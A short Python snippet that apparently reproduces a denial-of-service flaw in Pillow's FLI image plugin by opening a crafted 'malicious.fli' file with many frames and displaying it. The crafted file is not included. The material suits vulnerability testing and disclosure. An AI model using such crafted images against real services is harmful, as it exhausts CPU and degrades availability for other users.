# Import the Pillow library
from PIL import Image

# Open a malicious FLI image file
# This file has a large number of frames
# This will trigger the vulnerability in the FliImagePlugin.py module
# The open function will try to read each frame
# This will result in excessive CPU consumption
img = Image.open("malicious.fli")

# Try to display the image
# This will also trigger the vulnerability
img.show()